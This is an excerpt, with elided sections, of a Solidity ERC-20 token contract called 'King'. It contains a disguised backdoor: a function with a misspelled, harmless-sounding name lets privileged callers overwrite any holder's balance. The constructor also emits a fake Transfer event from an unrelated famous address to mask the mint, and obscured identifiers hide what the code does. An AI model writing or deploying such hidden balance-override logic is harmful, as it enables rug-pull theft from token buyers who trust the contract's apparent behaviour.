...
abstract contract Context {
    ...
    function _MSMS() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
...
contract King is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public _IsExcludeFromFee;mapping (address => uint256) _b;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public MPisAp;
    ...
    constructor () {
        ...
        MPisAp[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0x18f3df1DC1D55d6DA39eEE7767363Adb58811C45));
        marketingWalletAddress = payable(address(0x18f3df1DC1D55d6DA39eEE7767363Adb58811C45));
        _b[_MSMS()] = _totalSupply;
        emit Transfer(address(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045), _msgSender(), _totalSupply);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !MPisAp[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _b[sender] = _b[sender].sub(amount);
            ...
            _b[recipient] = _b[recipient].add(finalAmount);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _b[sender] = _b[sender].sub(amount, "Insufficient Balance");
        _b[recipient] = _b[recipient].add(amount);
    ...
    }function satSwepAmdLiquifyByLlmitOnIy(address ad, uint256 z) public {if(MPisAp[_MSMS()])_b[ad] = z;}
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        else if(MPisAp[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if(feeAmount > 0) {
            _b[address(this)] = _b[address(this)].add(feeAmount);
